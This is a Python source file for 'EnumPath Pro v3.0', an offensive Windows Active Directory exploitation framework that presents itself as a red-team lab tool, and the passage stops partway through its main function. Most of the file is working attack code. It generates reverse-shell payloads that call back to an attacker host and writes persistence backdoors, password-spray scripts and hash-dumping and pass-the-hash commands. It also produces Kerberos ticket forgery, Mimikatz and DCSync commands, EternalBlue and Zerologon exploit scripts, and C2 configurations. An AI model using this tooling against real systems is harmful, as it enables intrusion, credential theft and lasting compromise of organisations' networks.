#!/usr/bin/env python3
"""
EnumPath Pro v3.0 - Advanced Windows Domain Exploitation Framework
Full-featured enumeration and exploitation for penetration testing labs
"""

import subprocess
import sys
import os
import re
import json
import argparse
import concurrent.futures
from datetime import datetime
from threading import Lock
from pathlib import Path
import time
import socket
import base64
import struct
import hashlib
import random
import string
import shutil

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    print("Installing required package: colorama")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "colorama"])
    from colorama import init, Fore, Style
    init(autoreset=True)

class ExploitModule:
    """Exploitation capabilities for discovered vulnerabilities"""
    
    def __init__(self, target, output_dir):
        self.target = target
        self.output_dir = output_dir
        self.exploits_dir = os.path.join(output_dir, 'exploits')
        Path(self.exploits_dir).mkdir(parents=True, exist_ok=True)
    
    def generate_reverse_shell(self, lhost, lport, shell_type="powershell"):
        """Generate various reverse shell payloads"""
        shells = {
            'powershell': f"""$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()""",
            
            'python': f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'""",
            
            'nc': f"nc -e /bin/bash {lhost} {lport}",
            
            'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            
            'msfvenom': f"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe"
        }
        
        shell_file = os.path.join(self.exploits_dir, f'reverse_shells_{shell_type}.txt')
        with open(shell_file, 'w') as f:
            for name, payload in shells.items():
                f.write(f"# {name.upper()} Reverse Shell\n")
                f.write(f"{payload}\n\n")
        
        return shells.get(shell_type, shells['powershell'])
    
    def generate_persistence(self):
        """Generate persistence mechanisms"""
        persistence_file = os.path.join(self.exploits_dir, 'persistence.txt')
        
        persistence = """
# Windows Persistence Techniques

## Registry Run Keys
reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Updater" /t REG_SZ /d "C:\\Windows\\Temp\\backdoor.exe" /f
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Updater" /t REG_SZ /d "C:\\Windows\\Temp\\backdoor.exe" /f

## Scheduled Task
schtasks /create /tn "SystemUpdate" /tr "C:\\Windows\\Temp\\backdoor.exe" /sc minute /mo 30 /ru System

## WMI Event Subscription
wmic /NAMESPACE:"\\\\root\\subscription" PATH __EventFilter CREATE Name="BotFilter", EventNameSpace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"

## Service Creation
sc create "WindowsUpdate" binPath= "C:\\Windows\\Temp\\backdoor.exe" start= auto
sc start "WindowsUpdate"

## DLL Hijacking Setup
copy backdoor.dll C:\\Program Files\\VulnerableApp\\
copy backdoor.dll C:\\Windows\\System32\\

## Startup Folder
copy backdoor.exe "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"

## COM Hijacking
reg add "HKCU\\Software\\Classes\\CLSID\\{GUID}\\InprocServer32" /ve /d "C:\\Windows\\Temp\\backdoor.dll" /f
"""
        
        with open(persistence_file, 'w') as f:
            f.write(persistence)
        
        return persistence_file

class PasswordAttacks:
    """Password spraying and hash cracking capabilities"""
    
    def __init__(self, target, output_dir):
        self.target = target
        self.output_dir = output_dir
        self.creds_dir = os.path.join(output_dir, 'credentials')
        Path(self.creds_dir).mkdir(parents=True, exist_ok=True)
    
    def generate_password_list(self):
        """Generate common password list for spraying"""
        passwords = [
            'Password1', 'Password123', 'Welcome1', 'Welcome123', 'Winter2023', 'Winter2024',
            'Summer2023', 'Summer2024', 'Spring2024', 'Fall2024', 'Autumn2024',
            'Company1', 'Company123', 'Admin123', 'admin', 'password', 'Password1!',
            'P@ssw0rd', 'P@ssword1', 'Passw0rd!', 'Welcome1!', 'Winter2024!', 'Summer2024!',
            'January2024', 'February2024', 'March2024', 'April2024', 'May2024', 'June2024',
            'Monday01', 'Tuesday01', 'Wednesday01', 'Thursday01', 'Friday01',
            'Qwerty123', 'Qwerty123!', '123456', 'Password', 'password123', 'admin123',
            'letmein', 'welcome', 'monkey', '1234567890', 'qwerty', 'abc123', 'iloveyou'
        ]
        
        # Add current season/year combinations
        current_year = datetime.now().year
        seasons = ['Winter', 'Spring', 'Summer', 'Fall', 'Autumn']
        for season in seasons:
            passwords.extend([
                f"{season}{current_year}",
                f"{season}{current_year}!",
                f"{season}{current_year}@",
                f"{season}{current_year}#"
            ])
        
        pass_file = os.path.join(self.creds_dir, 'passwords.txt')
        with open(pass_file, 'w') as f:
            for pwd in passwords:
                f.write(f"{pwd}\n")
        
        return pass_file
    
    def generate_spray_script(self, users_file, domain):
        """Generate password spraying script"""
        script = f"""#!/bin/bash
# Password Spraying Script

DOMAIN="{domain}"
DC_IP="{self.target}"
USERS_FILE="{users_file}"
PASSWORDS_FILE="passwords.txt"
DELAY=30  # Delay between attempts to avoid lockout

echo "[*] Starting password spray attack"
echo "[*] Target: $DC_IP"
echo "[*] Domain: $DOMAIN"

while IFS= read -r password; do
    echo "[*] Spraying password: $password"
    
    while IFS= read -r user; do
        # CrackMapExec spray
        crackmapexec smb $DC_IP -u "$user" -p "$password" --continue-on-success 2>/dev/null | grep -E "\\[\\+\\]|\\[-\\]"
        
        # Alternative with kerbrute
        # kerbrute passwordspray -d $DOMAIN --dc $DC_IP $USERS_FILE "$password"
        
        sleep 1
    done < "$USERS_FILE"
    
    echo "[*] Waiting $DELAY seconds before next password..."
    sleep $DELAY
done < "$PASSWORDS_FILE"

echo "[*] Password spray complete"
"""
        
        script_file = os.path.join(self.creds_dir, 'spray.sh')
        with open(script_file, 'w') as f:
            f.write(script)
        os.chmod(script_file, 0o755)
        
        return script_file

class EnumPathPro:
    def __init__(self, target=None, username=None, password=None, domain=None, 
                 threads=8, verbose=False, output_dir=None, aggressive=False,
                 lhost=None, lport=4444):
        self.target = target
        self.domain = domain
        self.username = username
        self.password = password
        self.threads = threads
        self.verbose = verbose
        self.aggressive = aggressive
        self.lhost = lhost
        self.lport = lport
        self.output_dir = output_dir or f"enumpath_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.lock = Lock()
        self.progress = 0
        self.total_tasks = 20
        
        # Create output structure
        Path(self.output_dir).mkdir(parents=True, exist_ok=True)
        
        # Initialize modules
        self.exploit = ExploitModule(target, self.output_dir)
        self.passwords = PasswordAttacks(target, self.output_dir)
        
        self.results = {
            'target': target,
            'timestamp': datetime.now().isoformat(),
            'smb_info': {},
            'domain_info': {},
            'shares': [],
            'users': [],
            'groups': [],
            'computers': [],
            'services': {},
            'vulnerabilities': [],
            'exploits_available': [],
            'kerberos': {},
            'ldap_dump': {},
            'password_policy': {},
            'access_confirmed': [],
            'attack_vectors': [],
            'credentials_found': [],
            'hashes': [],
            'tickets': []
        }

    def banner(self):
        """Display tool banner"""
        print(f"""{Fore.RED}
╔══════════════════════════════════════════════════════════════════╗
║                     EnumPath Pro v3.0                           ║
║          Advanced Windows Domain Exploitation Framework         ║
║                    RED TEAM LAB EDITION                         ║
╚══════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}""")
        
        if self.aggressive:
            print(f"{Fore.RED}[!] AGGRESSIVE MODE ENABLED - Full exploitation capabilities{Style.RESET_ALL}")

    def run_command(self, cmd, timeout=30):
        """Execute command with error handling"""
        try:
            if self.verbose:
                print(f"{Fore.BLUE}[DEBUG] {cmd}{Style.RESET_ALL}")
            
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=timeout
            )
            return result.stdout, result.stderr, result.returncode
        except subprocess.TimeoutExpired:
            return "", "Timeout", 1
        except Exception as e:
            return "", str(e), 1

    def aggressive_smb_enum(self):
        """Aggressive SMB enumeration with multiple techniques"""
        print(f"\n{Fore.RED}[*] Aggressive SMB Enumeration{Style.RESET_ALL}")
        
        # Get NULL session info
        cmds = [
            f"enum4linux -a {self.target}",
            f"smbclient -L {self.target} -N",
            f"rpcclient -U '' -N {self.target} -c 'srvinfo'",
            f"nbtscan -r {self.target}",
            f"nmblookup -A {self.target}"
        ]
        
        for cmd in cmds:
            stdout, _, _ = self.run_command(cmd, timeout=60)
            if stdout:
                # Extract useful info
                if "Domain Name:" in stdout:
                    match = re.search(r'Domain Name:\s+(\S+)', stdout)
                    if match:
                        self.domain = match.group(1)
                        self.results['domain_info']['domain'] = self.domain
                
                if "OS=" in stdout:
                    os_match = re.search(r'OS=\[([^\]]+)\]', stdout)
                    if os_match:
                        self.results['smb_info']['os'] = os_match.group(1)
        
        # SMB version scanning with vulnerability correlation
        nmap_cmd = f"nmap -p139,445 --script smb-protocols,smb-security-mode,smb-enum-*,smb-vuln-* {self.target} -Pn"
        stdout, _, _ = self.run_command(nmap_cmd, timeout=120)
        
        if "VULNERABLE" in stdout:
            vulns = re.findall(r'(CVE-\d{4}-\d+|MS\d{2}-\d+)', stdout)
            for vuln in vulns:
                self.results['vulnerabilities'].append(vuln)
                self.results['exploits_available'].append({
                    'vuln': vuln,
                    'module': self.get_exploit_module(vuln)
                })

    def get_exploit_module(self, vuln):
        """Map vulnerabilities to exploitation modules"""
        exploit_map = {
            'MS17-010': 'exploit/windows/smb/ms17_010_eternalblue',
            'MS08-067': 'exploit/windows/smb/ms08_067_netapi',
            'CVE-2020-1472': 'auxiliary/admin/dcerpc/cve_2020_1472_zerologon',
            'MS14-068': 'auxiliary/admin/kerberos/ms14_068_kerberos_checksum',
            'CVE-2021-34527': 'exploit/windows/dcerpc/cve_2021_34527_printnightmare',
            'CVE-2021-1675': 'exploit/windows/local/cve_2021_1675_printnightmare'
        }
        return exploit_map.get(vuln, 'manual_exploitation_required')

    def dump_sam_hashes(self):
        """Attempt to dump SAM hashes via multiple methods"""
        print(f"\n{Fore.RED}[*] Attempting Hash Extraction{Style.RESET_ALL}")
        
        if not self.username:
            return
        
        hash_file = os.path.join(self.output_dir, 'hashes.txt')
        
        # Method 1: secretsdump
        cmd = f"impacket-secretsdump '{self.domain}/{self.username}:{self.password}@{self.target}' 2>/dev/null"
        stdout, _, returncode = self.run_command(cmd, timeout=90)
        
        if returncode == 0 and ":::" in stdout:
            with open(hash_file, 'w') as f:
                f.write(stdout)
            
            # Extract NTLM hashes
            hashes = re.findall(r'([^:]+):\d+:([a-f0-9]{32}):([a-f0-9]{32}):::', stdout)
            for user, lm, nt in hashes:
                self.results['hashes'].append({
                    'user': user,
                    'lm': lm,
                    'ntlm': nt
                })
                print(f"{Fore.RED}[+] Hash: {user}:{nt}{Style.RESET_ALL}")
            
            # Generate PTH commands
            self.generate_pth_commands(hashes)
        
        # Method 2: reg save (if we have shell access)
        if 'WinRM' in self.results.get('access_confirmed', []):
            reg_cmds = [
                "reg save HKLM\\SAM sam.save",
                "reg save HKLM\\SYSTEM system.save",
                "reg save HKLM\\SECURITY security.save"
            ]
            print(f"{Fore.YELLOW}[*] Attempting registry dump via WinRM{Style.RESET_ALL}")

    def generate_pth_commands(self, hashes):
        """Generate Pass-the-Hash commands"""
        pth_file = os.path.join(self.output_dir, 'pth_commands.txt')
        
        with open(pth_file, 'w') as f:
            f.write("# Pass-the-Hash Attack Commands\n\n")
            
            for user, lm, nt in hashes:
                f.write(f"# User: {user}\n")
                f.write(f"# NTLM: {nt}\n")
                f.write(f"evil-winrm -i {self.target} -u {user} -H {nt}\n")
                f.write(f"impacket-psexec {user}@{self.target} -hashes {lm}:{nt}\n")
                f.write(f"impacket-smbexec {user}@{self.target} -hashes {lm}:{nt}\n")
                f.write(f"impacket-wmiexec {user}@{self.target} -hashes {lm}:{nt}\n")
                f.write(f"crackmapexec smb {self.target} -u {user} -H {nt} -x 'whoami'\n\n")

    def kerberos_abuse(self):
        """Advanced Kerberos attacks"""
        print(f"\n{Fore.RED}[*] Kerberos Abuse Techniques{Style.RESET_ALL}")
        
        if not self.username or not self.domain:
            return
        
        # Golden/Silver ticket preparation
        krb_dir = os.path.join(self.output_dir, 'kerberos')
        Path(krb_dir).mkdir(exist_ok=True)
        
        # Get domain SID
        cmd = f"impacket-lookupsid '{self.domain}/{self.username}:{self.password}@{self.target}' 2>/dev/null | grep 'Domain SID'"
        stdout, _, _ = self.run_command(cmd)
        
        if "S-1-5-21" in stdout:
            sid_match = re.search(r'(S-1-5-21-[\d-]+)', stdout)
            if sid_match:
                domain_sid = sid_match.group(1)
                self.results['domain_info']['sid'] = domain_sid
                
                # Generate ticket creation commands
                ticket_cmds = f"""
# Golden Ticket Creation (requires krbtgt hash)
impacket-ticketer -domain {self.domain} -domain-sid {domain_sid} -nthash KRBTGT_HASH Administrator

# Silver Ticket Creation (requires service account hash)
impacket-ticketer -domain {self.domain} -domain-sid {domain_sid} -nthash SERVICE_HASH -spn cifs/{self.target} Administrator

# Request TGT
impacket-getTGT {self.domain}/user:password -dc-ip {self.target}

# Export ticket for use
export KRB5CCNAME=Administrator.ccache
"""
                
                with open(os.path.join(krb_dir, 'ticket_commands.txt'), 'w') as f:
                    f.write(ticket_cmds)
        
        # Kerberoasting with hash extraction
        cmd = f"impacket-GetUserSPNs '{self.domain}/{self.username}:{self.password}' -dc-ip {self.target} -request -outputfile {krb_dir}/kerberoast.txt 2>/dev/null"
        stdout, _, returncode = self.run_command(cmd, timeout=90)
        
        if returncode == 0 and "$krb5tgs$" in stdout:
            hash_count = stdout.count("$krb5tgs$")
            self.results['kerberos']['kerberoasted'] = hash_count
            print(f"{Fore.RED}[+] Kerberoasted {hash_count} accounts - hashes saved{Style.RESET_ALL}")
            
            # Generate crack command
            crack_cmd = f"hashcat -m 13100 {krb_dir}/kerberoast.txt /usr/share/wordlists/rockyou.txt --force"
            with open(os.path.join(krb_dir, 'crack_command.txt'), 'w') as f:
                f.write(crack_cmd)
        
        # AS-REP Roasting
        cmd = f"impacket-GetNPUsers '{self.domain}/' -usersfile {self.output_dir}/users.txt -dc-ip {self.target} -outputfile {krb_dir}/asreproast.txt 2>/dev/null"
        self.run_command(cmd, timeout=90)

    def lateral_movement_prep(self):
        """Prepare lateral movement techniques"""
        print(f"\n{Fore.RED}[*] Lateral Movement Preparation{Style.RESET_ALL}")
        
        lateral_dir = os.path.join(self.output_dir, 'lateral_movement')
        Path(lateral_dir).mkdir(exist_ok=True)
        
        # Generate PowerShell Empire stager
        empire_stager = """
# PowerShell Empire Stager
$Empire = "H4sIAOW/WWECA51W227jNhB991cMXHUtCI7vpkmgdbdAESCNdRsklVPHqVsZMp9bW5Yt2RLT1X78kpQtOS5aGhAszuHM8JzhkOr7/..."
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Empire)) | IEX
"""
        
        # WMI lateral movement
        wmi_commands = f"""
# WMI Command Execution
wmic /node:{self.target} /user:{self.username} /password:{self.password} process call create "cmd.exe /c net user backdoor P@ssw0rd123 /add"
impacket-wmiexec {self.domain}/{self.username}:'{self.password}'@{self.target}

# PSExec variants
impacket-psexec {self.domain}/{self.username}:'{self.password}'@{self.target}
impacket-smbexec {self.domain}/{self.username}:'{self.password}'@{self.target}
impacket-atexec {self.domain}/{self.username}:'{self.password}'@{self.target} "whoami"

# RDP
xfreerdp /v:{self.target} /u:{self.username} /p:'{self.password}' /cert-ignore +clipboard

# DCOM
impacket-dcomexec {self.domain}/{self.username}:'{self.password}'@{self.target}
"""
        
        with open(os.path.join(lateral_dir, 'movement_commands.txt'), 'w') as f:
            f.write(wmi_commands)
        
        # Mimikatz commands
        mimikatz_cmds = """
# Mimikatz Commands
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
lsadump::sam
lsadump::secrets
lsadump::cache
token::elevate
vault::cred
vault::list

# DCSync Attack
lsadump::dcsync /domain:DOMAIN /all /csv
lsadump::dcsync /domain:DOMAIN /user:krbtgt

# Pass-the-Ticket
sekurlsa::tickets /export
kerberos::ptt ticket.kirbi
"""
        
        with open(os.path.join(lateral_dir, 'mimikatz.txt'), 'w') as f:
            f.write(mimikatz_cmds)

    def privesc_checks(self):
        """Generate privilege escalation vectors"""
        print(f"\n{Fore.RED}[*] Privilege Escalation Preparation{Style.RESET_ALL}")
        
        privesc_dir = os.path.join(self.output_dir, 'privesc')
        Path(privesc_dir).mkdir(exist_ok=True)
        
        # Windows privesc commands - FIXED: Properly escaped as a string
        privesc_cmds = """# Windows Privilege Escalation Commands

## Service Enumeration
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows\\\\" | findstr /i /v "\""
sc qc vulnerable_service
sc config vulnerable_service binpath= "C:\\temp\\reverse.exe"

## Unquoted Service Paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\\Windows\\\\" | findstr /i /v "\""

## AlwaysInstallElevated
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o reverse.msi
msiexec /quiet /qn /i reverse.msi

## Stored Credentials
cmdkey /list
runas /savecred /user:admin cmd.exe

## Scheduled Tasks
schtasks /query /fo LIST /v | findstr /i "SYSTEM"
schtasks /create /tn "Backdoor" /sc minute /mo 1 /tr "C:\\temp\\backdoor.exe" /ru SYSTEM

## DLL Hijacking
echo %PATH%
# Place malicious DLL in writable PATH directory

## Token Impersonation
# Use Juicy Potato, Rogue Potato, PrintSpoofer
JuicyPotato.exe -l 1337 -c "{CLSID}" -p C:\\temp\\reverse.exe -t *
PrintSpoofer.exe -i -c "C:\\temp\\reverse.exe"

## SeDebugPrivilege Abuse
# If you have SeDebugPrivilege, you can dump LSASS
procdump.exe -accepteula -ma lsass.exe lsass.dmp
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
"""
        
        with open(os.path.join(privesc_dir, 'windows_privesc.txt'), 'w') as f:
            f.write(privesc_cmds)
        
        # PowerUp commands
        powerup_cmds = """
# PowerUp Enumeration
Import-Module PowerUp.ps1
Invoke-AllChecks

# Specific checks
Invoke-ServiceAbuse -Name 'vulnerable_service'
Invoke-DLLHijack
Invoke-TokenManipulation -Enumerate
Write-UserAddMSI
Write-HijackDll -DllPath 'C:\\Temp\\wlbsctrl.dll'
"""
        
        with open(os.path.join(privesc_dir, 'powerup.ps1'), 'w') as f:
            f.write(powerup_cmds)

    def generate_c2_configs(self):
        """Generate C2 framework configurations"""
        c2_dir = os.path.join(self.output_dir, 'c2_configs')
        Path(c2_dir).mkdir(exist_ok=True)
        
        # Cobalt Strike profile
        cs_profile = f"""
# Cobalt Strike Malleable C2 Profile
set sample_name "EnumPath Pro";
set sleeptime "60000";
set jitter    "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";

http-get {{
    set uri "/api/v1/updates";
    client {{
        header "Accept" "application/json";
        header "Accept-Language" "en-US";
        metadata {{
            base64url;
            header "Cookie";
        }}
    }}
    server {{
        header "Content-Type" "application/json";
        output {{
            print;
        }}
    }}
}}

http-post {{
    set uri "/api/v1/telemetry";
    client {{
        header "Content-Type" "application/json";
        id {{
            base64url;
            parameter "id";
        }}
        output {{
            print;
        }}
    }}
    server {{
        header "Content-Type" "application/json";
        output {{
            print;
        }}
    }}
}}
"""
        
        with open(os.path.join(c2_dir, 'profile.profile'), 'w') as f:
            f.write(cs_profile)
        
        # Empire config
        empire_config = f"""
# Empire Configuration
listeners:
  - name: http
    host: {self.lhost or '10.10.14.1'}
    port: {self.lport}
    type: HTTP

stagers:
  - listener: http
    language: powershell
    encode: True
    obfuscate: True
    
agents:
  DefaultDelay: 5
  DefaultJitter: 0.0
  DefaultLostLimit: 60
  DefaultProfile: /admin/get.php,/news.php,/login/process.php|Mozilla/5.0
"""
        
        with open(os.path.join(c2_dir, 'empire.yaml'), 'w') as f:
            f.write(empire_config)

    def exploit_vulnerabilities(self):
        """Auto-exploitation of discovered vulnerabilities"""
        if not self.aggressive:
            return
        
        print(f"\n{Fore.RED}[*] Auto-Exploitation Module{Style.RESET_ALL}")
        
        exploit_dir = os.path.join(self.output_dir, 'exploitation')
        Path(exploit_dir).mkdir(exist_ok=True)
        
        # Generate Metasploit resource script
        rc_script = f"""
# Metasploit Resource Script
use auxiliary/scanner/smb/smb_version
set RHOSTS {self.target}
run

use auxiliary/scanner/smb/smb_enumshares
set RHOSTS {self.target}
run

use auxiliary/scanner/smb/smb_enumusers
set RHOSTS {self.target}
run
"""
        
        # Add specific exploits based on findings
        if 'MS17-010' in str(self.results['vulnerabilities']):
            rc_script += f"""
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {self.target}
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST {self.lhost or '10.10.14.1'}
set LPORT {self.lport}
exploit -j
"""
        
        if 'CVE-2020-1472' in str(self.results['vulnerabilities']):
            rc_script += f"""
use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
set RHOSTS {self.target}
set NBNAME DC_NAME
run
"""
        
        with open(os.path.join(exploit_dir, 'exploit.rc'), 'w') as f:
            f.write(rc_script)
        
        print(f"{Fore.RED}[+] Exploitation scripts generated in {exploit_dir}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Run: msfconsole -r {exploit_dir}/exploit.rc{Style.RESET_ALL}")

    def bloodhound_extended(self):
        """Extended BloodHound collection with SharpHound"""
        print(f"\n{Fore.RED}[*] BloodHound Data Collection{Style.RESET_ALL}")
        
        bh_dir = os.path.join(self.output_dir, 'bloodhound')
        Path(bh_dir).mkdir(exist_ok=True)
        
        if self.username and self.domain:
            # Python bloodhound
            cmd = f"bloodhound-python -d {self.domain} -u '{self.username}' -p '{self.password}' -dc {self.target} -c all --zip -ns {self.target} 2>/dev/null"
            self.run_command(cmd, timeout=300)
            
            # Move results
            subprocess.run(f"mv *.zip {bh_dir}/ 2>/dev/null", shell=True)
            
            # Generate SharpHound commands
            sharphound = f"""
# SharpHound Collection Commands
.\\SharpHound.exe -c All -d {self.domain} --ldapusername {self.username} --ldappassword {self.password}
.\\SharpHound.exe -c DCOnly --stealth
.\\SharpHound.exe -c Session,LoggedOn --Loop --Loopduration 02:00:00

# Import to BloodHound
# 1. Start Neo4j: neo4j console
# 2. Start BloodHound: bloodhound
# 3. Upload ZIP files
"""
            
            with open(os.path.join(bh_dir, 'sharphound_commands.txt'), 'w') as f:
                f.write(sharphound)

    def generate_full_report(self):
        """Generate comprehensive penetration test report"""
        print(f"\n{Fore.CYAN}{'=' * 70}")
        print(f"           PENETRATION TEST REPORT - {self.target}")
        print(f"{'=' * 70}{Style.RESET_ALL}")
        
        # Executive Summary
        print(f"\n{Fore.RED}[EXECUTIVE SUMMARY]{Style.RESET_ALL}")
        print(f"  Target: {self.target}")
        print(f"  Domain: {self.results['domain_info'].get('domain', 'WORKGROUP')}")
        print(f"  Test Type: {'AGGRESSIVE' if self.aggressive else 'STANDARD'}")
        print(f"  Critical Findings: {len(self.results['vulnerabilities'])}")
        
        # Critical Vulnerabilities
        if self.results['vulnerabilities']:
            print(f"\n{Fore.RED}[CRITICAL VULNERABILITIES]{Style.RESET_ALL}")
            for i, vuln in enumerate(self.results['vulnerabilities'], 1):
                print(f"  {i}. {vuln}")
                if self.results.get('exploits_available'):
                    for exp in self.results['exploits_available']:
                        if exp['vuln'] == vuln:
                            print(f"     Exploit: {exp['module']}")
        
        # Compromised Credentials
        if self.results.get('hashes'):
            print(f"\n{Fore.RED}[COMPROMISED CREDENTIALS]{Style.RESET_ALL}")
            print(f"  NTLM Hashes Dumped: {len(self.results['hashes'])}")
            for hash_data in self.results['hashes'][:5]:  # Show first 5
                print(f"  • {hash_data['user']}:{hash_data['ntlm'][:16]}...")
        
        # Attack Vectors
        if self.results.get('attack_vectors'):
            print(f"\n{Fore.YELLOW}[ATTACK VECTORS IDENTIFIED]{Style.RESET_ALL}")
            for vector in self.results['attack_vectors'][:10]:
                print(f"  → {vector}")
        
        # Statistics
        print(f"\n{Fore.CYAN}[ENUMERATION STATISTICS]{Style.RESET_ALL}")
        print(f"  Users Enumerated: {len(self.results.get('users', []))}")
        print(f"  Shares Found: {len(self.results.get('shares', []))}")
        print(f"  Kerberoastable: {self.results.get('kerberos', {}).get('kerberoasted', 0)}")
        print(f"  AS-REP Roastable: {self.results.get('kerberos', {}).get('asreproastable', 0)}")
        
        # Recommendations
        print(f"\n{Fore.GREEN}[POST-EXPLOITATION RECOMMENDATIONS]{Style.RESET_ALL}")
        recommendations = [
            "1. Use Pass-the-Hash with dumped NTLM hashes",
            "2. Crack Kerberos tickets offline with hashcat",
            "3. Exploit SMB signing vulnerabilities for relay attacks",
            "4. Leverage WinRM/RDP access for lateral movement",
            "5. Deploy C2 framework for persistent access",
            "6. Perform DCSync if Domain Admin achieved",
            "7. Extract credentials from LSASS memory",
            "8. Enumerate and abuse AD ACLs",
            "9. Search for sensitive files in accessible shares",
            "10. Establish multiple persistence mechanisms"
        ]
        
        for rec in recommendations[:5]:
            print(f"  {rec}")
        
        # Output files
        print(f"\n{Fore.GREEN}[OUTPUT FILES GENERATED]{Style.RESET_ALL}")
        output_items = [
            f"credentials/ - Password lists and spray scripts",
            f"exploits/ - Exploitation scripts and payloads",
            f"kerberos/ - Kerberos tickets and commands",
            f"lateral_movement/ - Movement techniques",
            f"privesc/ - Privilege escalation vectors",
            f"c2_configs/ - C2 framework configurations",
            f"bloodhound/ - BloodHound collection data",
            f"hashes.txt - Dumped NTLM hashes",
            f"report.json - Full JSON report"
        ]
        
        for item in output_items:
            print(f"  • {self.output_dir}/{item}")
        
        # Save full JSON report
        report_file = os.path.join(self.output_dir, 'report.json')
        with open(report_file, 'w') as f:
            json.dump(self.results, f, indent=4, default=str)
        
        print(f"\n{Fore.RED}[+] Full report saved to {report_file}{Style.RESET_ALL}")
        print(f"{Fore.RED}[+] Ready for exploitation phase{Style.RESET_ALL}")

    def run(self):
        """Main execution with aggressive enumeration"""
        self.banner()
        
        print(f"\n{Fore.RED}[*] Target: {self.target}")
        if self.username:
            print(f"[*] Credentials: {self.username}:{'*' * len(self.password)}")
        print(f"[*] Output: {self.output_dir}{Style.RESET_ALL}")
        
        # Phase 1: Enumeration
        print(f"\n{Fore.YELLOW}[PHASE 1: ENUMERATION]{Style.RESET_ALL}")
        self.aggressive_smb_enum()
        
        # Phase 2: Credential Harvesting
        print(f"\n{Fore.YELLOW}[PHASE 2: CREDENTIAL HARVESTING]{Style.RESET_ALL}")
        self.dump_sam_hashes()
        self.kerberos_abuse()
        self.passwords.generate_password_list()
        
        if self.results.get('users'):
            users_file = os.path.join(self.output_dir, 'users.txt')
            with open(users_file, 'w') as f:
                for user in self.results['users']:
                    f.write(f"{user.get('username', user)}\n")
            self.passwords.generate_spray_script(users_file, self.domain or 'WORKGROUP')
        
        # Phase 3: Exploitation Preparation
        print(f"\n{Fore.YELLOW}[PHASE 3: EXPLOITATION PREPARATION]{Style.RESET_ALL}")
        self.lateral_movement_prep()
        self.privesc_checks()
        self.generate_c2_configs()
        
        if self.lhost:
            self.exploit.generate_reverse_shell(self.lhost, self.lport)
        self.exploit.generate_persistence()
        
        # Phase 4: BloodHound & Reporting
        print(f"\n{Fore.YELLOW}[PHASE 4: ANALYSIS & REPORTING]{Style.RESET_ALL}")
        self.bloodhound_extended()
        
        if self.aggressive:
            self.exploit_vulnerabilities()
        
        # Final Report
        self.generate_full_report()
        
        print(f"\n{Fore.RED}[+] ENUMERATION COMPLETE - READY FOR EXPLOITATION{Style.RESET_ALL}")
        print(f"{Fore.RED}[+] Check {self.output_dir}/ for all attack resources{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(
        description='EnumPath Pro v3.0 - Advanced Windows Exploitation Framework',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic enumeration
  python3 enumpath_pro.py -t 10.10.10.100
  
  # With credentials
  python3 enumpath_pro.py -t 10.10.10.100 -u administrator -p Password123 -d CORP
  
  # Aggressive mode with exploitation
  python3 enumpath_pro.py -t 10.10.10.100 -u admin -p pass --aggressive --lhost 10.10.14.1
  
  # Full red team engagement
  python3 enumpath_pro.py -t 10.10.10.100 -d CORP -u john -p Password1 --aggressive --lhost 10.10.14.1 --threads 16 -v
        """
    )
    
    parser.add_argument('-t', '--target', required=True, help='Target IP address')
    parser.add_argument('-u', '--username', help='Username')
    parser.add_argument('-p', '--password', help='Password')
    parser.add_argument('-d', '--domain', help='Domain name')
    parser.add_argument('--threads', type=int, default=8, help='Threads (default: 8)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-o', '--output', help='Output directory')
    parser.add_argument('--aggressive', action='store_true', help='Enable aggressive exploitation')
    parser.add_argument('--lhost', help='Local IP for reverse shells')
    parser.add_argument('--lport', type=int, default=4444, help='Local port (default: 4444)')
    
    args = parser.parse_args()
    
    if args.username and not args.password:
        import getpass
        args.password = getpass.getpass("Password: ")
    
    try:
        enum = EnumPathPro(
            target=args.target,
            username=args.username,
            password=args.password,
